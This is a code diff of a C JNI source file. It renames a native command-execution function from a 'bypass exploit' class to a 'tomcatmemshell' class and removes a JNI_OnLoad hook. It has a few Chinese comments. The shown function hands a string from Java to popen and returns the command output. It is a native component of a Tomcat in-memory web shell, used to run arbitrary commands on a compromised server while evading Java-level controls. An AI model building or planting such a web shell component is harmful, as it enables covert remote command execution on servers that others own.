@@ -1,4 +1,4 @@
-#include "com_bypass_exploit_JNI_Command.h"
+#include "org_example_tomcatmemshell_JNI_JNIMemShell.h"
 #include <string.h>
 #include <stdio.h>
 #include <sys/types.h>
@@ -22,7 +22,7 @@ int execmd(const char *cmd, char *result)
     pclose(pipe); //关闭管道
     return 1;      //返回1表示运行成功
 }
-JNIEXPORT jstring JNICALL Java_com_bypass_exploit_JNI_Command_exec(JNIEnv *env, jobject class_object, jstring jstr)
+JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_exec(JNIEnv *env, jclass clazz, jstring jstr)
 {
 
     const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
@@ -38,7 +38,4 @@ JNIEXPORT jstring JNICALL Java_com_bypass_exploit_JNI_Command_exec(JNIEnv *env, 
     //system();
 
     return cmdresult;
-}
-JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){
-    return JNI_VERSION_1_4; //这里很重要，必须返回版本，否则加载会失败。
 }
